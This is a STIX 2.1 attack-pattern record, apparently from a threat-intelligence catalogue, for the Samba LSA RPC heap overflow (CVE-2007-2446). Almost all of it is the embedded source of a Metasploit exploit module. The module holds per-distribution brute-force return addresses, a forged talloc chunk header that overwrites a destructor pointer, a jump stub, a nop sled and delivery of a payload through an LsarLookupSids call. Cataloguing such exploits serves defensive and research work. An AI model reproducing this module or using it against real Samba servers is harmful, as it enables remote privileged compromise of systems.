{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f8627a3-9fc1-4884-a1bb-3db2934766c9",
    "created": "2024-08-14T16:56:58.524411Z",
    "modified": "2024-08-14T16:56:58.524415Z",
    "name": "Samba lsa_io_trans_names Heap Overflow",
    "description": " This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the TALLOC chunk overwrite method (credit Ramon and Adriano), which only works with Samba versions 3.0.21-3.0.24. Additionally, this module will not work when the Samba \"log level\" parameter is higher than \"2\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/samba/lsa_transnames_heap.rb",
            "external_id": "lsa_transnames_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2446"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba lsa_io_trans_names Heap Overflow',\n      'Description'    => %q{\n        This module triggers a heap overflow in the LSA RPC service\n      of the Samba daemon. This module uses the TALLOC chunk overwrite\n      method (credit Ramon and Adriano), which only works with Samba\n      versions 3.0.21-3.0.24. Additionally, this module will not work\n      when the Samba \"log level\" parameter is higher than \"2\".\n      },\n      'Author'         =>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-2446'],\n          ['OSVDB', '34699'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024, # no limit really\n        },\n      'Platform'       => 'linux',\n      'DefaultOptions' =>\n        {\n          'PrependSetresuid' => true,\n          'PrependSetreuid'  => true,\n          'PrependSetuid'    => true,\n        },\n      'Targets'        =>\n        [\n          ['Linux vsyscall',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xffffe410 },\n                'Stop'  => { 'Ret' => 0xffffe413 },\n                'Step'  => 1,\n              }\n          }\n          ],\n\n\n          ##\n          # 08356000-0843d000 rwxp 08356000 00:00 0 (Debian)      # KF\n          # 80300000-8042f000 rw-p 80300000 00:00 0 (Gentoo)      # hdm\n          # b800f000-b80c9000 rwxp b800f000 00:00 0 (RHEL/CentOS) # Adriano/Ramon\n          # 80365000-80424000 rwxp 80365000 00:00 0 (SUSE)        # Adriano/Ramon\n          # 8033c000-80412000 rwxp 00000000 00:00 0 (Slackware)   # Adriano/Ramon\n          # 08342000-08436000 rwxp 00000000 00:00 0 (Ubuntu)      # hdm\n          # 08270000-0837f000 rwxp 00000000 00:00 0 (SNAP)        # Andrew\n          #\n          ##\n\n          ['Linux Heap Brute Force (Debian/Ubuntu)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x08352000 },\n                'Stop'  => { 'Ret' => 0x0843d000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n          ['Linux Heap Brute Force (Gentoo)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x80310000 },\n                'Stop'  => { 'Ret' => 0x8042f000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n\n\n          ['Linux Heap Brute Force (Mandriva)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x80380000 },\n                'Stop'  => { 'Ret' => 0x8045b000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n          ['Linux Heap Brute Force (RHEL/CentOS)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xb800f000 },\n                'Stop'  => { 'Ret' => 0xb80c9000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n          ['Linux Heap Brute Force (SUSE)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x80365000 },\n                'Stop'  => { 'Ret' => 0x80424000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n          ['Linux Heap Brute Force (Slackware)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64*1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x8033c000 },\n                'Stop'  => { 'Ret' => 0x80412000 },\n                'Step'  => 60*1024,\n\n              }\n          }\n          ],\n\n          ['Linux Heap Brute Force (OpenWRT MIPS)',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_MIPSBE ],\n            'Nops'          => 64*1024,\n            'Bruteforce'    =>\n              {\n                'Start' => { 'Ret' => 0x55900000 },\n                'Stop'  => { 'Ret' => 0x559c0000 },\n                'Step'  => 60*1024,\n              }\n          }\n          ],\n\n          ['DEBUG',\n          {\n            'Platform'      => 'linux',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xAABBCCDD },\n                'Stop'  => { 'Ret' => 0xAABBCCDD },\n                'Step'  => 4,\n              }\n          }\n          ],\n        ],\n      'DisclosureDate' => '2007-05-14',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use\", 'LSARPC']),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def check\n    begin\n      connect(versions: [1])\n      smb_login()\n      disconnect()\n      if (smb_peer_lm() =~ /Samba/i)\n        return CheckCode::Detected\n      else\n        return CheckCode::Safe\n      end\n    rescue ::Exception\n      return CheckCode::Safe\n    end\n  end\n\n  def brute_exploit(target_addrs)\n\n    if(not @nops)\n      if (target['Nops'] > 0)\n        print_status(\"Creating nop sled....\")\n        @nops = make_nops(target['Nops'])\n      else\n        @nops = ''\n      end\n\n      # @nops = \"\\xcc\" * (@nops.length)\n    end\n\n    print_status(\"Trying to exploit Samba with address 0x%.8x...\" % target_addrs['Ret'])\n\n    nops = @nops\n    pipe = datastore['SMBPIPE'].downcase\n\n    print_status(\"Connecting to the SMB service...\")\n    connect(versions: [1])\n    smb_login()\n\n    if ! @checked_peerlm\n      if smb_peer_lm !~ /Samba 3\\.0\\.2[1234]/i\n        fail_with(Failure::NoTarget, \"This target is not a vulnerable Samba server (#{smb_peer_lm})\")\n      end\n    end\n\n    @checked_peerlm = true\n\n    datastore['DCERPC::fake_bind_multi'] = false\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    jumper = \"P\" * 256\n    jumper[24, 5] = \"\\xe9\" + [-5229-11-5-(nops.length/2)].pack('V')\n\n    num_entries  = 256\n    num_entries2 = 272\n\n    # first talloc_chunk\n    # 16 bits align\n    # 16 bits sid_name_use\n    #     16 bits uni_str_len\n    #     16 bits uni_max_len\n    #     32 bits buffer\n    # 32 bits domain_idx\n    buf = (('A' * 16) * num_entries)\n\n    # padding\n    buf << 'A' * 8\n\n    # TALLOC_MAGIC\n    talloc_magic = \"\\x70\\xec\\x14\\xe8\"\n\n    # second talloc_chunk header\n    buf << NDR.long(0) + NDR.long(0) # next, prev\n    buf << NDR.long(0) + NDR.long(0) # parent, child\n    buf << NDR.long(0)               # refs\n    buf << [target_addrs['Ret']].pack('V') # destructor\n    buf << 'A' * 4                   # name\n    buf << 'A' * 4                   # size\n    buf << talloc_magic              # flags\n    buf << jumper\n\n    stub = lsa_open_policy(dcerpc)\n\n    stub << NDR.long(0)            # num_entries\n    stub << NDR.long(0)            # ptr_sid_enum\n    stub << NDR.long(num_entries)  # num_entries\n    stub << NDR.long(0x20004)      # ptr_trans_names\n    stub << NDR.long(num_entries2) # num_entries2\n    stub << buf\n    stub << nops\n    stub << payload.encoded\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      # LsarLookupSids\n      dcerpc.call(0x0f, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError\n      print_status('Server did not respond, this is expected')\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      print_error('Server is most likely patched...')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      else\n        print_error(\"Error: #{e.class}: #{e}\")\n      end\n    end\n\n    handler\n    disconnect\n  end\n\n  def lsa_open_policy(dcerpc, server=\"\\\\\")\n    stubdata =\n      # Server\n      NDR.uwstring(server) +\n      # Object Attributes\n        NDR.long(24) + # SIZE\n        NDR.long(0)  + # LSPTR\n        NDR.long(0)  + # NAME\n        NDR.long(0)  + # ATTRS\n        NDR.long(0)  + # SEC DES\n          # LSA QOS PTR\n          NDR.long(1)  + # Referent\n          NDR.long(12) + # Length\n          NDR.long(2)  + # Impersonation\n          NDR.long(1)  + # Context Tracking\n          NDR.long(0)  + # Effective Only\n      # Access Mask\n      NDR.long(0x02000000)\n\n    res = dcerpc.call(6, stubdata)\n\n    dcerpc.last_response.stub_data[0,20]\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}